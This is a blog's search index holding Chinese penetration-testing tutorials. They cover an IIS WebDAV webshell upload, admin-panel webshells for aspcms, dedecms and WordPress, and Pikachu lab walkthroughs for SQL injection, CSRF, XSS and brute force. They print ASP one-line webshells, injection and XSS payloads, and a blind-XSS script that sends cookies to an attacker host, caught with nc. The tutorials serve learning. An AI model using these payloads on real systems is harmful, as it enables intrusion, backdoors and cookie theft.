<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IIS任意文件写入漏洞</title>
      <link href="/archives/1f4414ad.html"/>
      <url>/archives/1f4414ad.html</url>
      
        <content type="html"><![CDATA[<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV,配置了可以写入的权限，造成任意文件上传。<br>版本：IIS 6.0</p><h2 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h2><p>Ⅰ 开启 WebDAV 和写权限<br><img src="https://pic.888888.al/i/2023/03/04/fomu4q.png" alt="0"><br><img src="https://pic.888888.al/i/2023/03/04/fr28m6.png" alt="1"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用burpsuite 提交OPTIONS 查看支持的协议。<br><img src="https://pic.888888.al/i/2023/03/04/fsprkx.png" alt="2"></p><p>使用PUT请求，创建一个.txt的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Content-Length: <span class="number">25</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>使用MOVE请求，将.txt的文件改为.asp文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MOVE /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Destination: http:<span class="comment">//upload.moonteam.com/shell.asp</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/gjfi01.png" alt="3"></p><p>shell.asp写入成功。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aspcms拿webshell</title>
      <link href="/archives/d8c67745.html"/>
      <url>/archives/d8c67745.html</url>
      
        <content type="html"><![CDATA[<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>网站中的配置文件，如果可在后台里进行修改，如果没有任何过滤，可以在里面写入而已的语句，即可<br>获取webshell。</p><p><strong>注</strong>：注意闭合问题，因为配置文件在网站中是全局调用，如果写错，网站会错误。无法访问。<br>在aspcms可以修改 如果是字符类型填写双引号闭合 如果是数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br><span class="line"><span class="string">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>一样的，通过弱口令进入到后台。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/03/03/kglyj8.jpg" alt="0"></p><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>点击<strong>拓展功能-&gt;幻灯片管理</strong>，打开<strong>burpsuit</strong>进行抓包。<br><img src="https://pic.888888.al/i/2023/03/03/khq2hk.jpg" alt="1"><br>在<strong>slidestyle</strong>的后面写入一句话木马，注意闭合问题，并进行URL-encode。<br><img src="https://pic.888888.al/i/2023/03/03/kjiypm.jpg" alt="2"><br>放包，用蚁剑尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/03/03/kk3gui.jpg" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms后台拿webshell</title>
      <link href="/archives/226c5523.html"/>
      <url>/archives/226c5523.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>我们用弱口令爆破，将账号和密码穷举出来。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/03/03/k0eljh.jpg" alt="0"></p><h2 id="方法一：文件上传"><a href="#方法一：文件上传" class="headerlink" title="方法一：文件上传"></a>方法一：文件上传</h2><p>我们进入到<strong>核心-&gt;文件上传</strong>这个位置，直接上传带有木马的文件。<br><img src="https://pic.888888.al/i/2023/03/03/k1640o.jpg" alt="1"><br><strong>上传成功!</strong><br><img src="https://pic.888888.al/i/2023/03/03/k1ovue.jpg" alt="2"></p><h2 id="方法二：修改模块文件"><a href="#方法二：修改模块文件" class="headerlink" title="方法二：修改模块文件"></a>方法二：修改模块文件</h2><p>进入<strong>模板-&gt;index.html</strong>，点击修改。<br><img src="https://pic.888888.al/i/2023/03/03/k2zamn.jpg" alt="3"><br>加入我们的payload。<br><img src="https://pic.888888.al/i/2023/03/03/k3jzmv.jpg" alt="4"><br>修改成功后，我们到生成这个界面，将主页位置中文件的后缀改为.php，然后更新主页。<br><img src="https://pic.888888.al/i/2023/03/03/k4tbbv.jpg" alt="5"><br>点击游览，上床成功！<br><img src="https://pic.888888.al/i/2023/03/03/k59nf3.jpg" alt="6"></p><h2 id="方法三：后台任意命令执行"><a href="#方法三：后台任意命令执行" class="headerlink" title="方法三：后台任意命令执行"></a>方法三：后台任意命令执行</h2><p>在dedecms后台广告管理，可以插入php任意代码。<br><img src="https://pic.888888.al/i/2023/03/03/k62oyl.jpg" alt="7"></p><p>点击增加一个广告位，在广告内容写入payload。<br><img src="https://pic.888888.al/i/2023/03/03/k729bl.jpg" alt="8"></p><p>用中国菜刀尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/03/03/k7mvvc.jpg" alt="9"><br><img src="https://pic.888888.al/i/2023/03/03/k7q9cr.jpg" alt="10"></p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress后台拿webshell</title>
      <link href="/archives/0.html"/>
      <url>/archives/0.html</url>
      
        <content type="html"><![CDATA[<h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>首先我们通过弱口令爆破拿到wordpress的账号和密码。</p><p>账号：admin 密码：123456</p><p><img src="https://pic.888888.al/i/2023/03/03/faajzy.jpg" alt="1"></p><h2 id="方法一：模板编辑"><a href="#方法一：模板编辑" class="headerlink" title="方法一：模板编辑"></a>方法一：模板编辑</h2><p>我们到外观-&gt;编辑这个模块，选择404模板，在404.php中写入php一句话木马。</p><p>点击更新文件<br><img src="https://pic.888888.al/i/2023/03/03/f975wn.jpg" alt="2"></p><p>我们可以看到在服务器后台的404.php文件中确实被我们写入了一句话木马了。<br><img src="https://pic.888888.al/i/2023/03/03/fbjwmd.jpg" alt="3"></p><p>我们妨问404.php并且用蚁剑尝试连接。<br><img src="https://pic.888888.al/i/2023/03/03/fcj0i9.jpg" alt="4"><br>连接成功！<br><img src="https://pic.888888.al/i/2023/03/03/fdub1b.jpg" alt="5"></p><h2 id="方法二：上传主题"><a href="#方法二：上传主题" class="headerlink" title="方法二：上传主题"></a>方法二：上传主题</h2><p>我们进入到外观-&gt;主题界面，将带有木马的文件写入主题中，再上传上去。<br><img src="https://pic.888888.al/i/2023/03/03/im4sz3.jpg" alt="6"></p><p>点击上传<br><img src="https://pic.888888.al/i/2023/03/03/inlh77.jpg" alt="7"><br>妨问这个主题中带有木马的文件<br><img src="https://pic.888888.al/i/2023/03/03/io7o4c.jpg" alt="8"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>模板编辑拿webshell</strong></p><p>通过修改模块写入一句话，网站再调用模板的时，会自动加载这个模板，运行后门。<br><strong>文件上传拿webshell</strong></p><p>通过后台的上传模块，上传网页后门，就可以拿到webshell。</p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之SQL</title>
      <link href="/archives/c4c569e3.html"/>
      <url>/archives/c4c569e3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Sql-Inject-SQL注入-介绍"><a href="#Sql-Inject-SQL注入-介绍" class="headerlink" title="Sql Inject(SQL注入)介绍"></a>Sql Inject(SQL注入)介绍</h2><pre><code>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。**一个严重的SQL注入漏洞，可能会直接导致一家公司破产！SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重! SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。  </code></pre><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>第一关，选择查询的id然后点击查询就能查询到数据，这时候我对查询进行抓包。<br><img src="https://pic.888888.al/i/2023/03/02/j4lor4.png" alt="1">  </p><p>右键 <em>Send to Repeater</em><br><img src="https://pic.888888.al/i/2023/03/02/j4xdvs.png" alt="2">  </p><p>我们在id这块进行测试，在后面添加 or 1&#x3D;1 发现有注入点:<br><img src="https://pic.888888.al/i/2023/03/02/j51bkx.png" alt="3">  </p><h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h2><p>输入想查找的东西，点击查询进行查找,这边我们直接在输入框中进行测试,和上题一样输入 <strong>lili or 1&#x3D;1#</strong>,发现有注入点：<br><img src="https://pic.888888.al/i/2023/03/02/j5jw79.png" alt="4"></p><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>和上题一样 ，输入**lili\**破坏其内部数据库语句结构<br><img src="https://pic.888888.al/i/2023/03/02/j5o9n2.png" alt="5"><br><img src="https://pic.888888.al/i/2023/03/02/j5qtyi.png" alt="6">  </p><h2 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h2><p>这边我们点击<strong>注册</strong>，在用户栏进行注入。payload为:<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/03/02/j6672e.png" alt="7"><br><img src="https://pic.888888.al/i/2023/03/02/j6b45y.png" alt="8">  </p><h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><p>这里是一个留言板，我们随便写一点东西进去，鼠标移到 <em>删除</em> 在左下角可以看到<strong>id&#x3D;60</strong>,说明我们的数据是有id头的，所以点击删除抓包。<br><img src="https://pic.888888.al/i/2023/03/02/j6dpt9.png" alt="9"><br>我们在id&#x3D;60后面注入即可：<br><img src="https://pic.888888.al/i/2023/03/02/juig8t.png" alt="10"><br><img src="https://pic.888888.al/i/2023/03/02/julscr.png" alt="11">  </p><h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p>有些时候，后台开发人员为了验证客户端头信息，比如常用的cookie验证，或者通过http请求头信息获取客户端的一些信息，比如useragent、accept字段等等，会对客户端的http请求头信息获取并使用sql进行处理，如果此时没有足够的安全考虑，则可能会导致基于http头的sql注入漏洞  </p><p>首先，我们点击 <em>点击退出</em> 抓包<br><img src="https://pic.888888.al/i/2023/03/02/jurv6r.png" alt="12">  </p><p>在<strong>User-Agent</strong>进行注入,payload为<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/03/02/jv2zig.png" alt="13">  </p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>时间盲注主要使用if语句，通过延迟信息进行判断，不看回显信息，这里就不多说了，使用SQLMAP效果更佳，手动测试难免有误差。</p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之CSRF</title>
      <link href="/archives/f3a6c1ad.html"/>
      <url>/archives/f3a6c1ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF-跨站请求伪造-攻击介绍"><a href="#CSRF-跨站请求伪造-攻击介绍" class="headerlink" title="CSRF(跨站请求伪造)攻击介绍"></a>CSRF(跨站请求伪造)攻击介绍</h2><pre><code>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。场景需求：小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。先看下大白是如何修改自己的密码的：登录---修改会员信息，提交请求---修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。为啥小黑的操作能够实现呢。有如下几个关键点：1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。 因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：--对敏感信息的操作增加安全的token；--对敏感信息的操作增加安全的验证码；--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。如果你没有读太明白,不要犹豫,请再读一遍啦  </code></pre><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>通过以上的介绍，我们知道要想构成CSRF攻击，首先得诱导受害者点击我们的网页。我们先进入到其中一个用户的内部。<br><img src="https://pic.888888.al/i/2023/03/02/j2gts1.png" alt="1"><br>点击修改个人信息，修改手机号，点击提交并抓包。<br><img src="https://pic.888888.al/i/2023/03/02/j2l5z2.png" alt="2"><br>将数据包中的<strong>GET</strong>和<strong>HOTS</strong>内容保存，并创建一个简单的html网页，代码如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span> New Document <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UIF-8&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=999&amp;add=&amp;email=&amp;submit=submit HTTP/1.1&quot;</span>&gt;</span>点我抽奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图:<br><img src="https://pic.888888.al/i/2023/03/02/j2nqcr.png" alt="3"></p><p>当用户点击 <em>点我抽奖</em> 时会触发CSRF攻击,直接修改了用户的手机号。<br><img src="https://pic.888888.al/i/2023/03/02/j2r07y.png" alt="4">  </p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果是POST型的，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击  </p><p>攻击者可以搭建一个站点，在站点上做一个表单，诱导vince点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p><p>这里我们用Burp Suite自带的csrf功能构造一个站点:<br><img src="https://pic.888888.al/i/2023/03/02/j3cru1.png" alt="5"><br><img src="https://pic.888888.al/i/2023/03/02/j3oh8l.png" alt="6"><br>同上面操作一样即可。  </p><h2 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h2><p><strong>CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造，每次请求，都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求。</strong></p><p><strong>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了，对于token，暂时还没有什么办法通过</strong></p><p><strong>所以，使用token是一个很好的防御CSRF攻击的方法。</strong></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之XSS</title>
      <link href="/archives/77aee975.html"/>
      <url>/archives/77aee975.html</url>
      
        <content type="html"><![CDATA[<h2 id="跨站脚本攻击介绍"><a href="#跨站脚本攻击介绍" class="headerlink" title="跨站脚本攻击介绍"></a>跨站脚本攻击介绍</h2><p><strong>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型:</strong>  </p><pre><code>    1.反射性XSS;    2.存储型XSS;    3.DOM型XSS;XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;  </code></pre><h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</strong> 即可：<br><img src="https://pic.888888.al/i/2023/03/02/jwi81x.png" alt="1">  </p><h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>先登录进去,同样在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong> 即可<br><img src="https://pic.888888.al/i/2023/03/02/jwkce0.png" alt="2">  </p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。  </p><p>同样在输入框中输入**&lt;script&gt;alert(1)&lt;&#x2F;script&gt;**，当有人浏览你的留言时都会触发XSS。<br><img src="https://pic.888888.al/i/2023/03/02/jww161.png" alt="3">  </p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>查看页面的源代码，找到输入框的位置，可以看到输入的东西在前端进行了过滤，所以只要把前面语法闭合掉，然后添加自己的语法即可,<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jwy7xa.png" alt="4"><br><img src="https://pic.888888.al/i/2023/03/02/jx0ov5.png" alt="5">  </p><h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>同上一样的方法，审查一下js就好:<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jx3oe7.png" alt="6"><br><img src="https://pic.888888.al/i/2023/03/02/jx5khc.png" alt="7">  </p><h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><strong>盲打就是前端不会做出任何反馈，只有后台管理员知道，你写了什么，这时候我们就要利用nc反弹来获得管理员的cookie，进而可以登录到后台。</strong>  </p><p>我们用这个payload来打<strong>&lt;script&gt;var img&#x3D;document.createElement(“img”);img.src&#x3D;”http:&#x2F;&#x2F;[你的ip]:4444&#x2F;a?”+escape(document.cookie);&lt;&#x2F;script&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxgh13.png" alt="8">  </p><p>提交完之后，我们用nc监听:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/jxj47b.png" alt="9"><br><strong>当管理员进入后台，看到我们写的东西后，nc也就监听到了:</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxlgle.png" alt="10">  </p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>前端对我们提交的语句进行了过滤，考虑大小写绕过 <strong>&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxnm5w.png" alt="11"></p><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>我们使用 <strong>‘ onclick&#x3D;’alert(1)’</strong>  payload去打:<br><img src="https://pic.888888.al/i/2023/03/02/jxpe0r.png" alt="12"></p><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>通过分析得知直接使用js伪协议即可:<strong>javascript:alert(1)</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxre6x.png" alt="13"></p><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>通过分析得知， 他将我们输入的字符存到了js代码里面然后进行判断，我们可以根据代码写一个闭合:<strong>‘&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jy2q6x.png" alt="14"><br><img src="https://pic.888888.al/i/2023/03/02/jy4v8z.png" alt="15"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之暴力破解</title>
      <link href="/archives/ec9ffc46.html"/>
      <url>/archives/ec9ffc46.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解介绍"><a href="#暴力破解介绍" class="headerlink" title="暴力破解介绍"></a>暴力破解介绍</h2><p><strong>这一关主要通过Burp Suite工具进行暴力破解，主要测试网站是否有弱口令漏洞。</strong></p><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>很简单的一个登录窗口<br><img src="https://pic.888888.al/i/2023/03/02/jyd8qp.png" alt="1"><br>我们先进一个抓包，再把数据报送到BP的 <em>intruder</em> 模块<br><img src="https://pic.888888.al/i/2023/03/02/jyno6p.png" alt="2"><br>进入到 <em>intruder</em> 点击 <em>clear</em> 再把<strong>username</strong>和<strong>password</strong>选中，攻击方式选择 <em>Cluster bomb</em><br><img src="https://pic.888888.al/i/2023/03/02/jyqd6t.png" alt="3"><br>点击 <em>Payloads</em> 添加字典<br><img src="https://pic.888888.al/i/2023/03/02/jyrvzb.png" alt="4"><br><img src="https://pic.888888.al/i/2023/03/02/jyv3fu.png" alt="5"><br>配置好后，点击右上角的 <em>Start attack</em>,等待攻击完成:<br><img src="https://pic.888888.al/i/2023/03/02/jz7swn.png" alt="6"><br>得到账号为<strong>admin</strong>，密码为<strong>123456</strong>  </p><p>尝试登录，登录成功。<br><img src="https://pic.888888.al/i/2023/03/02/jz9vcm.png" alt="7">  </p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p><strong>这是一个带验证码的登录窗口，我要考虑的是爆破的时候，验证码会不会因为页面刷新而刷新。</strong> </p><p>和上一关一样，直接尝试暴力破解，发现验证码不会刷新，所以账号密码很容易就出来了。<br><img src="https://pic.888888.al/i/2023/03/02/jzvdvg.png" alt="9"><br>尝试登陆，登录成功<br><img src="https://pic.888888.al/i/2023/03/02/jzx9py.png" alt="10">  </p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p><strong>同样是一个有验证码的登录窗口，用上一关的方法发现不行，验证码一直在变</strong><br><img src="https://pic.888888.al/i/2023/03/02/k02gia.png" alt="11">  </p><p>这时候我们F12查看这个页面的js代码:<br><img src="https://pic.888888.al/i/2023/03/02/k0i7cj.png" alt="12"><br><strong>发现这验证码是前端验证，前端验证是可以让我们随意更改的，这里提供一种方法，就是直接把浏览器的js功能关了</strong><br><img src="https://pic.888888.al/i/2023/03/02/k0kfd4.png" alt="13"><br>js功能关了后，直接就不需要验证码验证了，正常去爆破就好了。<br><img src="https://pic.888888.al/i/2023/03/02/k0mok0.png" alt="14">  </p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2><p><strong>最后一关，我们抓包发现其加了token防止我们暴力破解</strong><br><img src="https://pic.888888.al/i/2023/03/02/k0pq3s.png" alt="15">  </p><p>同样，我们先右键 <em>send to intruder</em> 攻击方式选择 <em>Pitchfork</em> 选中<strong>password</strong>和<strong>token</strong>：<br><img src="https://pic.888888.al/i/2023/03/02/k11bvi.png" alt="16">  </p><p>在payloads:1里面加入一些字典，然后点击 <em>Options</em>,_Number of threads改为1<br><img src="https://pic.888888.al/i/2023/03/02/k13pq1.png" alt="17">  </p><p>往下翻，点击 _Grep-Extract_中的 <em>add</em>,找到**name&#x3D;’token’**选中value里面的数字，让他自动生成一个正则表达式:<br><img src="https://pic.888888.al/i/2023/03/02/k16ght.png" alt="18"><br>点击ok后，继续往下翻，将 <em>Redirections</em> 中的 _Follow redirections_改为Always。<br><img src="https://pic.888888.al/i/2023/03/02/k194s1.png" alt="19">  </p><p>_Options_设置好后，到payloads:2里面，将 _Payload type_改为Recursive grep,在 <em>initial payload for first request</em> 中，将之前数据包中的token写到这里面:<br><img src="https://pic.888888.al/i/2023/03/02/k1qced.png" alt="20"><br><img src="https://pic.888888.al/i/2023/03/02/k1t0zu.png" alt="21">  </p><p>OK,可以开始暴力破解了:<br><img src="https://pic.888888.al/i/2023/03/02/k1vido.png" alt="22"><br>得到想要得账号密码，去登录：<br><img src="https://pic.888888.al/i/2023/03/02/k1xbqn.png" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali搭建vulhub靶场</title>
      <link href="/archives/be82d226.html"/>
      <url>/archives/be82d226.html</url>
      
